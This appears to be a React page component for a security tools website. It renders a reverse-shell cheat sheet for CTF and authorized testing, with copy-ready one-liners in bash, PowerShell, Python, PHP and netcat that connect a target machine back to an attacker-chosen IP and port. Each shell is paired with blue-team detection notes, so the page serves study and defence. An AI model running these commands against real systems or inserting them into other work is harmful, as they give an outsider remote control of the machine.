"use client";

import React, { useState } from 'react';
import { ToolLayout } from "@/components/tool-layout";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Copy, Terminal, ShieldAlert, Crosshair } from "lucide-react";
import Link from 'next/link';

type ShellCategory = 'Linux Bash' | 'Windows PowerShell' | 'Python' | 'PHP' | 'Netcat' | 'Socat';

type ShellEntry = {
  id: string;
  category: ShellCategory;
  name: string;
  command: string;
  explanation: string;
  requirements: string;
  detection: string;
};

const SHELLS: ShellEntry[] = [
  // Bash
  {
    id: "bash-1",
    category: "Linux Bash",
    name: "Bash TCP Reverse Shell",
    command: "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1",
    explanation: "Creates an interactive bash shell and redirects standard input, output, and error to a TCP socket connected to the listener.",
    requirements: "Requires bash to be compiled with /dev/tcp support (default on most modern Linux distros).",
    detection: "Look for 'bash -i' in process command lines, anomalous outbound connections to non-standard ports from web servers, or '/dev/tcp' in shell history."
  },
  {
    id: "bash-2",
    category: "Linux Bash",
    name: "Bash UDP Reverse Shell",
    command: "sh -i >& /dev/udp/{{IP}}/{{PORT}} 0>&1",
    explanation: "Similar to TCP, but uses UDP. Requires a UDP listener (e.g., nc -u -lvp PORT).",
    requirements: "Requires bash compiled with /dev/udp support.",
    detection: "Look for '/dev/udp' in command lines and anomalous UDP traffic leaving the server."
  },

  // PowerShell
  {
    id: "ps-1",
    category: "Windows PowerShell",
    name: "PowerShell TCP One-Liner",
    command: "$client = New-Object System.Net.Sockets.TCPClient('{{IP}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
    explanation: "Creates a .NET TCPClient to connect back to the listener, reads bytes, executes them via Invoke-Expression (iex), and sends the string output back.",
    requirements: "Requires PowerShell execution privileges (can bypass execution policy by passing it directly to powershell.exe -c).",
    detection: "Monitor Event ID 4104 (Script Block Logging) for keywords like 'TCPClient', 'GetStream', 'iex'. Look for powershell.exe establishing outbound network connections."
  },

  // Python
  {
    id: "py-1",
    category: "Python",
    name: "Python 3 IPv4 Reverse Shell",
    command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{IP}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",
    explanation: "Uses Python's socket library to connect back, duplicates standard file descriptors to the socket, and spawns an interactive shell using the pty module.",
    requirements: "Requires Python 3 installed on the target system.",
    detection: "Look for 'python' or 'python3' processes executing with '-c', especially with 'import pty' or 'socket.AF_INET' in the command line."
  },

  // PHP
  {
    id: "php-1",
    category: "PHP",
    name: "PHP Socket Reverse Shell",
    command: "php -r '$sock=fsockopen(\"{{IP}}\",{{PORT}});exec(\"sh <&3 >&3 2>&3\");'",
    explanation: "Opens a socket using fsockopen, then executes a shell redirecting its I/O to the socket file descriptor.",
    requirements: "Requires PHP CLI installed or executed via a web shell context.",
    detection: "Look for 'fsockopen' and 'exec' functions used together in PHP scripts, or 'php -r' running from the command line on web servers."
  },

  // Netcat
  {
    id: "nc-1",
    category: "Netcat",
    name: "Netcat -e (Traditional)",
    command: "nc -e /bin/sh {{IP}} {{PORT}}",
    explanation: "Connects to the listener and executes /bin/sh, piping the I/O across the network.",
    requirements: "Requires a version of Netcat compiled with the -e (execute) option (often removed in modern distros for security).",
    detection: "Monitor for 'nc' processes with the '-e' or '-c' flags."
  },
  {
    id: "nc-2",
    category: "Netcat",
    name: "Netcat mkfifo (OpenBSD netcat)",
    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} {{PORT}} >/tmp/f",
    explanation: "Creates a named pipe (FIFO) to route standard input and output between Netcat and the shell.",
    requirements: "Works on OpenBSD netcat versions that lack the -e option.",
    detection: "Look for 'mkfifo /tmp/f' or anomalous usage of named pipes in temporary directories."
  }
];

export default function ReverseShellReferencePage() {
  const [selectedCategory, setSelectedCategory] = useState<ShellCategory>('Linux Bash');
  const [ip, setIp] = useState('10.10.10.10');
  const [port, setPort] = useState('4444');
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  const filteredShells = SHELLS.filter(s => s.category === selectedCategory);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(id);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  const getHydratedCommand = (command: string) => {
    return command.replace(/{{IP}}/g, ip || 'IP').replace(/{{PORT}}/g, port || 'PORT');
  };

  return (
    <ToolLayout
      title="Reverse Shell Reference"
      description="Reference and study common shell techniques used in authorized security labs and CTFs."
    >
      <div className="w-full max-w-5xl mx-auto space-y-6">
        
        {/* DISCLAIMER */}
        <div className="bg-amber-950/30 border border-amber-900/50 rounded-none p-4 flex items-start gap-3">
          <ShieldAlert className="w-5 h-5 text-amber-500 mt-0.5 flex-shrink-0" />
          <div className="text-sm text-amber-200">
            <strong>Authorized Use Only:</strong> This reference is for study, defense, and authorized penetration testing. Pay special attention to the <em>Detection Notes</em> to understand how Blue Teams hunt for these indicators.
          </div>
        </div>

        {/* CONFIGURATION */}
        <div className="bg-[#0a0a0a] border border-[#1a1a1a] rounded-none p-4 grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="space-y-2">
            <label className="text-xs font-bold text-zinc-400 uppercase">Platform / Category</label>
            <Select value={selectedCategory} onValueChange={(v) => setSelectedCategory(v as ShellCategory)}>
              <SelectTrigger className="w-full bg-[#111] border-[#333] text-white rounded-none">
                <SelectValue />
              </SelectTrigger>
              <SelectContent className="bg-[#111] border-[#333] text-white rounded-none">
                {Array.from(new Set(SHELLS.map(s => s.category))).map(cat => (
                  <SelectItem key={cat} value={cat}>{cat}</SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div className="space-y-2">
            <label className="text-xs font-bold text-zinc-400 uppercase">Listener IP (Attacker)</label>
            <Input 
              value={ip}
              onChange={e => setIp(e.target.value)}
              className="bg-[#111] border-[#333] font-mono text-sm text-[#00ff9c] rounded-none focus-visible:ring-[#00ff9c]"
            />
          </div>
          <div className="space-y-2">
            <label className="text-xs font-bold text-zinc-400 uppercase">Listener Port</label>
            <Input 
              value={port}
              onChange={e => setPort(e.target.value)}
              className="bg-[#111] border-[#333] font-mono text-sm text-[#00ff9c] rounded-none focus-visible:ring-[#00ff9c]"
            />
          </div>
        </div>

        {/* SHELL LISTING */}
        <div className="space-y-6">
          {filteredShells.map(shell => {
            const finalCommand = getHydratedCommand(shell.command);
            
            return (
              <div key={shell.id} className="bg-[#0a0a0a] border border-[#1a1a1a] rounded-none overflow-hidden">
                <div className="bg-[#111] border-b border-[#1a1a1a] p-3 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-[#00ff9c]" />
                    <h2 className="text-sm font-bold text-white tracking-wide">{shell.name}</h2>
                  </div>
                  <Button variant="ghost" size="sm" onClick={() => copyToClipboard(finalCommand, shell.id)} className="h-6 text-xs text-[#00ff9c] hover:bg-transparent rounded-none">
                    {copiedCode === shell.id ? 'Copied!' : <><Copy className="w-3 h-3 mr-1" /> Copy</>}
                  </Button>
                </div>
                
                <div className="p-4 space-y-4">
                  {/* The Command */}
                  <div className="bg-[#111] border border-[#333] rounded-none p-4 font-mono text-sm text-zinc-300 break-all">
                    {finalCommand}
                  </div>

                  {/* Details Grid */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-2">
                    
                    {/* Mechanism & Requirements */}
                    <div className="space-y-4">
                      <div>
                        <h4 className="text-[10px] font-bold text-zinc-500 uppercase tracking-wider mb-1">How it works</h4>
                        <p className="text-sm text-zinc-400 leading-relaxed">{shell.explanation}</p>
                      </div>
                      <div>
                        <h4 className="text-[10px] font-bold text-zinc-500 uppercase tracking-wider mb-1">Requirements</h4>
                        <p className="text-sm text-zinc-400 leading-relaxed italic border-l-2 border-[#333] pl-3">{shell.requirements}</p>
                      </div>
                    </div>

                    {/* Blue Team Notes */}
                    <div className="bg-[#111] border border-blue-900/30 rounded-none p-4 space-y-3">
                      <div className="flex items-center gap-2 mb-2">
                        <Crosshair className="w-4 h-4 text-blue-400" />
                        <h4 className="text-xs font-bold text-blue-400 uppercase tracking-wider">Blue Team / Detection</h4>
                      </div>
                      <p className="text-sm text-blue-200/70 leading-relaxed">{shell.detection}</p>
                      
                      <div className="pt-3 mt-3 border-t border-blue-900/20">
                        <h4 className="text-[10px] font-bold text-blue-500/50 uppercase tracking-wider mb-2">Recommended Tools</h4>
                        <div className="flex flex-wrap gap-2">
                          <Link href="/tools/security/windows-events">
                            <Button variant="outline" size="sm" className="h-6 text-[10px] bg-transparent border-blue-900/50 text-blue-300 hover:bg-blue-900/20 rounded-none">
                              Windows Events
                            </Button>
                          </Link>
                          <Link href="/tools/security/log-parser">
                            <Button variant="outline" size="sm" className="h-6 text-[10px] bg-transparent border-blue-900/50 text-blue-300 hover:bg-blue-900/20 rounded-none">
                              Log Parser
                            </Button>
                          </Link>
                          <Link href="/tools/security/log-timeline">
                            <Button variant="outline" size="sm" className="h-6 text-[10px] bg-transparent border-blue-900/50 text-blue-300 hover:bg-blue-900/20 rounded-none">
                              Log Timeline
                            </Button>
                          </Link>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            );
          })}
        </div>

      </div>
    </ToolLayout>
  );
}
